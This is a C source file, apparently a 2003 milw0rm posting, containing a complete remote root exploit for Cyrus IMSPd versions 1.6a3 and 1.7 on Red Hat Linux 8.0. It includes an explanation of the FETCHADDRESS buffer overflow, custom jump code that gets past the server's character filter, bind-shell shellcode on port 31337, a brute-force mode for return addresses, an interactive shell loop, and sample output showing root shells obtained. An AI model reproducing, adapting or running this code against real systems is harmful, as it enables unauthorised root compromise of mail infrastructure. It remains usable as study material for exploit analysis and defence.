/*
** Cyrus IMSPD Remote Root Exploit
** -------------------------------
**
** Bug found by: Felix Lindner <felix.lindner@nruns.com>
** Exploit coded by: SpikE <spike_vrm@mail.com>
**
** Exploitation techinique:
**
** As said by Felix Lindner, the bug lies in the "abook_dbname" function. To cause
** the overrun, we must call this function with a long "name" variable. It can be
** acomplished by supplying the FETCHADDRESS command. This command takes 2 parameters.
** The first one is exactly the "name" var. So, to cause the overflow, we must just
** send the FETCHADDRESS command with an overlong argument.
** To cause the overflow is easy, but using it to execute arbitrary commands is not
** so easy. It is because IMSPd filters all characters that is grather than 0x80.
** Well, put the shellcode is not the problem, cause IMSPd does not filter the args
** after the second one, so, the Shellcode goes in the third arg. The problem is that
** the address of the buffer where the shellcode is placed contains chars grather than
** 0x80 and we can not supply this addr. Well, how it can be done??? After some time
** of research, I found that the address of the buffer where the "name" var is placed
** does not contains these characters (at least on my box). So, I manange my buffer
** to overwrite the EIP with this address. But there is another problem: I can not write
** my shellcode here. Again, after some time, I got the solution. Looking at the stack
** after the overflow, I found the address of the buffer where the shellcode was placed.
** So, I coded a Jumpcode to get this addr from the stack, add some offset to the shellcode
** and jump there. There was a dificult task once the RET opcode is 0xc3 and I can not
** place the code in the buffer. To circumvent it. I overflowned the EIP and the next
** four bytes with the same value. This way, when I get the control, I know where I am.
** With this ability, I can take this value, add some offset and make and ADD at this
** location to turn an 0x45 in an 0xc3, RET.
** Well, this is how I have acomplished this task. As you can see, there two possibilities
** of success. You can be lucky and found a system that the address os shellcode does not
** have invalid chars or the name addr too. Anyone of this will do the task.
**
** Well, that is all. Sorry for my poor english (I am brazilian), I am tired to correct it.
** I hope one can improve this code to be more reliable, but for now, it is not so BAD.
**
** Screenshot:
**
** Hardcoded:
**
** SpikE@VermE imsp]$ ./a.out -t 0 -h localhost
**
** ==[ Cyrus IMSPd Remote Root Exploit bY SpikE ]==
**
** *** Target plataform : IMSPd 1.7 - Red Hat Linux release 8.0 (Psyche)
** *** Target host : localhost
** *** Target port : 406
** *** Bind to port : 31337
** *** Target RET : 0x08065368
**
** [+] Connected
** [+] Creating evil buffer
** [+] Sending evil buffer
** [+] Verifying ...
** [+] Yeap.. It is a root shell
**
** Linux VermE.com.br 2.4.18-14 #1 Wed Sep 4 13:35:50 EDT 2002 i686 i686 i386 GNU/Linux
** uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
** cat /etc/issue
** Red Hat Linux release 8.0 (Psyche)
** Kernel \r on an \m
**
** exit
** [SpikE@VermE imsp]$
**
** Bruteforce:
**
** [SpikE@VermE imsp]$ ./a.out -h localhost -b
**
** ==[ Cyrus IMSPd Remote Root Exploit bY SpikE ]==
**
** *** Target host : localhost
** *** Target port : 406
** *** Bind to port : 31337
** *** Bruteforce mode start : 0x08065357
**
** [+] Using RetAddr = 0x08065357
** [+] Connected
** [+] Creating evil buffer
** [+] Sending evil buffer
** [+] Verifying ...
**
** [+] Using RetAddr = 0x0806535b
** [+] Connected
** [+] Creating evil buffer
** [+] Sending evil buffer
** [+] Verifying ...
**
** [+] Using RetAddr = 0x0806535f
** [+] Connected
** [+] Creating evil buffer
** [+] Sending evil buffer
** [+] Verifying ...
**
** [+] Using RetAddr = 0x08065363
** [+] Connected
** [+] Creating evil buffer
** [+] Sending evil buffer
** [+] Verifying ...
**
** [+] Using RetAddr = 0x08065367
** [+] Connected
** [+] Creating evil buffer
** [+] Sending evil buffer
** [+] Verifying ...
**
** [+] Using RetAddr = 0x0806536b
** [+] Connected
** ** [+] Creating evil buffer
** [+] Sending evil buffer
** [+] Verifying ...
** [+] Yeap.. It is a root shell
**
** Linux VermE.com.br 2.4.18-14 #1 Wed Sep 4 13:35:50 EDT 2002 i686 i686 i386 GNU/Linux
** uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
** cat /etc/issue
** Red Hat Linux release 8.0 (Psyche)
** Kernel \r on an \m
**
** exit
** [SpikE@VermE imsp]$
**
**
*/

#include <getopt.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <errno.h>
#include <netinet/in.h>
#include <stdio.h>

/*--< Prototypes >--*/
void Usage(char *);
void fatal(char *);
int ConectToHost(char *,int);
char *CreateEvilBuffer(int,int);
int VerifyXpl(char *, int);
void doHack(int);
int GetNextAddr(int);

/*--< Defines >--*/
#define DEFAULT_PORT 406
#define DEFAULT_START_ADDRESS 0x8061001
#define BRUTEFORCE 1
#define TARGET 2
#define STDIN 0
#define STDOUT 1
#define ROOT_PORT 31337
#define PORT_OFFSET 29

/*--< From IMSP Source >--*/
char im_table[256] = {
    0, 2, 2, 2, 2, 2, 2, 2, 2, 2, 0, 2, 2, 0, 2, 2,
    2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
    2, 7, 0, 7, 7, 6, 7, 7, 2, 2, 6, 7, 7, 7, 7, 7,
    7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7,
    7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7,
    7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 0, 7, 7, 7,
    7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7,
    7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 2, 7, 7, 7, 2,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
};
#define isqstr(c) (im_table[(unsigned char)(c)]&2)
/*--< END >--*/

struct
{
  char *Name;
  int Retaddr;
}Targets[] =
  {
    "IMSPd 1.7 - Red Hat Linux release 8.0 (Psyche)",
    0x8065368,

    "IMSPd 1.6a3 - Red Hat Linux release 8.0 (Psyche)",
    0x8061d78,

    // Finish
    0,
    0
  };

// Shellcode by Marco Ivaldi <raptor 0xdeadbeef info>
char Shellcode[] =
  "\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
  "\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80"
  "\x89\xc7\x52\x66\x68"
  "BP" // Port to bind
  "\x43\x66\x53\x89\xe1\xb0\x10\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80"
  "\xb0\x66\xb3\x04\xcd\x80"
  "\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80"
  "\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80"
  "\x41\xe2\xf8\x51\x68n/sh\x68//bi\x89\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80";

// Jumpcode bY SpikE
char JmpToShellcode[] =
  "\x41" // nop like
  "\x41" // nop like
  "\x41" // nop like
  "\x41" // nop like
  "\x41" // nop like
  "\x41" // nop like
  "\x41" // nop like

  "\x58" // pop %eax
  "\x6a\x7e" // push $0x7e
  "\x5b" // pop %ebx
  "\x01\x58\x23" // add %ebx,0x22(%eax)
  "\x58"
  "\x58" // pop %eax
  "\x58" // pop %eax
  "\x58" // pop %eax
  "\x58" // pop %eax
  "\x58" // pop %eax
  "\x58" // pop %eax
  "\x58" // pop %eax
  "\x58" // pop %eax
  "\x6a\x7e" // push $0x7e
  "\x58" // pop %eax
  "\x01\x44\x24\x04" // add %eax,0x4(%esp,1)
  "\x01\x44\x24\x04" // add %eax,0x4(%esp,1)
  "\x58" // pop %eax

  "\x45" // ret
  "\x45" // ret
  "\x45" // ret
  "\x45" // ret
  "\x45" // ret
  "\x45" // ret
  "\x45" // ret
  "\x45"; // ret

struct STACK
{
  char name[132];
  int eip;
  int ID;
  int Name;
  int Acl;
};

int main(int argc, char **argv)
{
  extern char *optarg;
  extern int optind;
    char opt;
    char *Host = NULL;
    int Port = DEFAULT_PORT;
    int Flags = 0;
    int StartAddress = DEFAULT_START_ADDRESS;
    int TargetNumber = 0;
    int Sock,rootSock,i;
    char *EvilBuffer;
    int BindPort = ROOT_PORT;

  fprintf(stdout,"\n==[ Cyrus IMSPd 1.7 Remote Root Exploit bY SpikE ]==\n\n");

  // Process arguments
  while ( (opt = getopt(argc,argv,"h:t:p:ba:r:")) != EOF)
  {
    switch(opt)
    {
      case 'r':
        BindPort = atoi(optarg);
        if(!BindPort) Usage(argv[0]);
      break;
      case 'h':
        Host = optarg;
      break;
      case 'p':
        Port = atoi(optarg);
        if(!Port) Usage(argv[0]);
      break;
      case 'b':
        if(Flags == 0)
          Flags = BRUTEFORCE;
        else
          Usage(argv[0]);
      break;
      case 'a':
        if( sscanf(optarg,"0x%lx",&StartAddress) != 1)
          Usage(argv[0]);
      break;
      case 't':
        TargetNumber = atoi(optarg);
        if(Flags == 0)
          Flags = TARGET;
        else
          Usage(argv[0]);
      break;
      default: Usage(argv[0]);
      break;
    }
  }
  if(Host == NULL || Flags == 0) Usage(argv[0]);

  // Verify target
  for(i=0;;i++)
    if(Targets[i].Name == 0) break;
  if(--i<TargetNumber) Usage(argv[0]);

  if(Flags == TARGET)
    fprintf(stdout,"*** Target plataform : %s\n",Targets[TargetNumber].Name);
  fprintf(stdout,"*** Target host : %s\n",Host);
  fprintf(stdout,"*** Target port : %u\n",Port);
  fprintf(stdout,"*** Bind to port : %u\n",BindPort);

  if(Flags == TARGET)
    fprintf(stdout,"*** Target RET : %#010x\n\n",Targets[TargetNumber].Retaddr);
  else
    fprintf(stdout,"*** Bruteforce mode start : %#010x\n\n",StartAddress);

  switch(Flags)
  {
    case TARGET:
      Sock = ConectToHost(Host,Port);
      if(Sock == -1) fatal("Could not connect");
      else fprintf(stdout,"[+] Connected\n");

      fprintf(stdout,"[+] Creating evil buffer\n");
      EvilBuffer = CreateEvilBuffer(Targets[TargetNumber].Retaddr,BindPort);

      fprintf(stdout,"[+] Sending evil buffer\n");

      scanf("%d",&i);
      
      send(Sock,EvilBuffer,strlen(EvilBuffer),0);
      sleep(1);

      fprintf(stdout,"[+] Verifying ...\n");
      sleep(1);
      if( (rootSock = VerifyXpl(Host,BindPort)) >=0)
      {
        close(Sock);
        free(EvilBuffer);
        fprintf(stdout,"[+] Yeap.. It is a root shell\n\n");
        doHack(rootSock);
        close(rootSock);
        exit(0);
      }
      else
        fatal("No root shell. Maybe next time");
    break;
    default:
      for(;;)
      {
        fprintf(stdout,"[+] Using RetAddr = %#010x\n",StartAddress);

        Sock = ConectToHost(Host,Port);
        if(Sock == -1) 
        {
          // To avoid stop the bruteforce
          fprintf(stdout,"[+] Could not connect. Waiting...\n\n");
          sleep(120);
        }
        else
        {
          fprintf(stdout,"[+] Connected\n");

          fprintf(stdout,"[+] Creating evil buffer\n");
          EvilBuffer = CreateEvilBuffer(StartAddress,BindPort);

          fprintf(stdout,"[+] Sending evil buffer\n");
          send(Sock,EvilBuffer,strlen(EvilBuffer),0);
          sleep(1);

          fprintf(stdout,"[+] Verifying ...\n");
          sleep(1);
          if( (rootSock = VerifyXpl(Host,BindPort)) >=0)
          {   // actualite informatique
            close(Sock);
            free(EvilBuffer);
            fprintf(stdout,"[+] Yeap.. It is a root shell\n\n");
            doHack(rootSock);
            close(rootSock);
            exit(0);
          }
          close(Sock);
          free(EvilBuffer);
          fprintf(stdout,"\n");

          StartAddress = GetNextAddr(StartAddress);
        }
      }
    break;
  }

  free(EvilBuffer);
  close(Sock);
}

void Usage(char *Prog)
{
  int i;
  fprintf(stderr, "Usage: %s -h hostname <options>\n\n"
      "Options:\n\n"
      " -t target : Select the target\n"
      " -p portnumber : Sets a new port number\n"
      " -b : Bruteforce mode\n"
      " -a address : Defines the start address to bruteforce (Format: 0xdeadbeef)\n"
      " -r port : Defines the port to bind (Default = 31337)\n\n"
      "Targets:\n\n",Prog);

  for(i=0;;i++)
  {
    if(Targets[i].Name != 0)
      fprintf(stderr," [%u] %s\n",i,Targets[i].Name);
    else
      break;
  }
  fprintf(stderr,"\n");
  exit(1);
}

void fatal(char *ErrorMsg)
{
  fprintf(stderr,"[-] %s\n\n",ErrorMsg);
  exit(1);
}

int ConectToHost(char *Host,int Port)
{
  struct sockaddr_in server;
  struct hostent *hp;
  int s;

  server.sin_family = AF_INET;
  hp = gethostbyname(Host);
  if(!hp) return(-1);

  memcpy(&server.sin_addr,hp->h_addr,hp->h_length);
  server.sin_port = htons(Port);

  s = socket(PF_INET,SOCK_STREAM,0);
  if(connect(s,(struct sockaddr *)&server, sizeof(server)) < 0)
    return(-1);

  return(s);
}

char *CreateEvilBuffer(int Retaddr,int BindPort)
{
  struct STACK Buffer;
  char *Ptr = (char *)&Buffer;
  char NOPs[2000];
  static char Buf[sizeof(Buffer)+sizeof(NOPs)+sizeof(Shellcode)+100];
  uint16_t *PortPtr = (uint16_t *)(Shellcode+PORT_OFFSET);
  int i;

  memset(&Buffer,0x41,sizeof(Buffer));
  memset(NOPs,0x90,sizeof(NOPs));

  *PortPtr = htons(BindPort);

  memcpy(Ptr,JmpToShellcode,sizeof(JmpToShellcode)-1);
  Buffer.eip = Retaddr;
  Buffer.ID = Retaddr;
  Buffer.Name = 0x00;

  NOPs[sizeof(NOPs)-1] = 0;
  
  sprintf(Buf,"SPK FETCHADDRESS \"%s\" \"SPK\" %s%s\r\n",(char *)&Buffer,NOPs,Shellcode);
  return(Buf);
}

void doHack(int Sock)
{
  char buffer[1024 * 10];
  int count;
  fd_set readfs;

  write(Sock,"uname -a;id\n",12);
  while(1)
  {
    FD_ZERO(&readfs);
    FD_SET(STDIN, &readfs);
    FD_SET(Sock, &readfs);
    if(select(Sock + 1, &readfs, NULL, NULL, NULL) > 0)
    {
      if(FD_ISSET(STDIN, &readfs))
      {
        if((count = read(STDIN, buffer, 1024)) <= 0)
        {
          if(errno == EWOULDBLOCK || errno == EAGAIN)
            continue;
          else
          {
            close(Sock);
            exit(-1);
          }
        }
        write(Sock, buffer, count);
      }
      if(FD_ISSET(Sock, &readfs))
      {
        if((count = read(Sock, buffer, 1024)) <= 0)
        {
          if(errno == EWOULDBLOCK || errno == EAGAIN)
            continue;
          else
          {
            close(Sock);
            exit(-1);
          }
        }
        write(STDOUT, buffer, count);
      }
    }
  }
}
int VerifyXpl(char *Host, int Port)
{
  struct sockaddr_in server;
  struct hostent *hp;
  int s;

  // Create client struct
  server.sin_family = AF_INET;
  hp = gethostbyname(Host);
  if(!hp)
    return(-1);
  memcpy(&server.sin_addr,hp->h_addr,hp->h_length);
  server.sin_port = htons(Port);
  s = socket(PF_INET,SOCK_STREAM,0);

  if(connect(s,(struct sockaddr *)&server, sizeof(server)) < 0)
    return(-1);
  return(s);
}

int GetNextAddr(int Addr)
{
  Addr+=4;
  for(;;)
  {
    if( !isqstr( (Addr & 0x000000FF) ) ) Addr+=4;
    else if( !isqstr( (Addr & 0x0000FF00) >> 8 ) ) Addr+=4;
    else if( !isqstr( (Addr & 0x00FF0000) >> 16 ) ) Addr+=4;
    else if( !isqstr( (Addr & 0xFF000000) >> 24 ) ) Addr+=4;
    else break;
  }
  
  return(Addr);
}

// milw0rm.com [2003-12-27]
